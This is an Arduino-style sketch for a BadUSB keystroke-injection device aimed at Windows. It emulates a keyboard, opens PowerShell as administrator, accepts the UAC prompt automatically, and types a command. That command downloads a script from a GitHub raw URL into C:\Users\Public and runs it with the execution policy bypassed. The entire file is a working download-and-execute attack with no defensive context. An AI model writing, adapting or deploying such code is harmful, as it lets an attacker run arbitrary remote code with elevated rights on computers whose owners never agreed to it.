#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

void setup() {
  USB.begin();
  Keyboard.begin();
  delay(1500);
}

void typeString(const char* str) {
  for (int i = 0; str[i] != '\0'; i++) {
    Keyboard.print(str[i]);
    delay(7); 
  }
}

void pressCombo(uint8_t key1, uint8_t key2) {
  Keyboard.press(key1);
  Keyboard.press(key2);
  delay(50);
  Keyboard.releaseAll();
  delay(50);
}

void loop() {
  delay(1000);

  pressCombo(KEY_LEFT_SHIFT, KEY_LEFT_CTRL);
  delay(300);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.releaseAll();
  delay(500);

  typeString("powershell");
  delay(300);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(300);
  Keyboard.releaseAll();
  delay(1600);  

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  delay(200);
  Keyboard.releaseAll();
  delay(1500);  

  typeString("$s='C:\\Users\\Public\\mainUSB.ps1';");
  delay(50);
  typeString("Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/usercode-admin/Badusb-Badble/main/badUSB_for_Win/main.ps1' -OutFile $s;");
  delay(50);
  typeString("powershell -ExecutionPolicy Bypass -File $s");
  delay(200);
  Keyboard.press(KEY_RETURN);
  delay(200);
  Keyboard.releaseAll();

  while(1);
}